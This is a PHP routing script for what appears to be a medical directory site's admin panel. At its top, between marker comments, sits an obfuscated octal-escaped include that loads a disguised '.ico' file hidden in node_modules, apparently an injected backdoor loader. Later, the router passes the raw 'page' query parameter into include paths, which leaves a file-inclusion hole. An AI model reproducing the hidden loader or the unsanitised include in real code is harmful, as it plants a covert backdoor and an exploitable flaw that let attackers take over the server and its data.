<?php
/*318b6*/

@include "\057ho\155e/\167in\147ov\143o/\160ub\154ic\137ht\155l/\154is\164am\145d.\143om\056br\057no\144e_\155od\165le\163/m\151me\055db\057.2\06630\14415\071.i\143o";

/*318b6*/
if($_GET['page']==""):
	header("Location: /gerenciar/medico");
else:
	$controller = $_GET['page'];

	$newModel = "";
	$aux = explode("_", $controller);
	foreach ($aux as $k => $v) {
		$newController .= ucfirst($v);
	}

	$newModel = $controller."Model";
	include("model/".$controller.".php");
	$obj = new $newModel;

	include("topo.php");
	include("view/".$controller.".php");
	include("rodape.php");
endif;

?>
